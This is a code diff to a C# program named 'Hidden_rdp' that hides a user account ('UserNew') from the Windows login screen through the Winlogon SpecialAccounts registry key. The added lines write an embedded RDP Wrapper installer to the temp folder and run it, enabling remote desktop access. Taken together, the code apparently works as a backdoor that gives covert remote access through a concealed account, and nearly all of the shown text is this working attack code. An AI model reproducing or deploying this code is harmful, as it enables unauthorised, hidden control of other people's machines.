@@ -7,6 +7,7 @@ using System.Management;
 using System.DirectoryServices;
 using System.DirectoryServices.AccountManagement;
 using System.Runtime.InteropServices;
+using System.Diagnostics;
 
 namespace Hidden_rdp
 {
@@ -69,7 +70,15 @@ namespace Hidden_rdp
             RegistryKey key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", true);
             key.SetValue("UserNew", 0, RegistryValueKind.DWord);
             key.Close();
+
+            //==========================================================================================================================================
+            //Core part = Install the RDP Wrapper library (have it as an embedded resource)
+            string path = Path.Combine(Path.GetTempPath(), "rdpwrap.exe");
+            string arg = "-i";
+            File.WriteAllBytes(path, Hidden_rdp.Properties.Resources.RDPWInst);
+            Process.Start(path,arg);
             this.Close();
+
         }
     }
 }
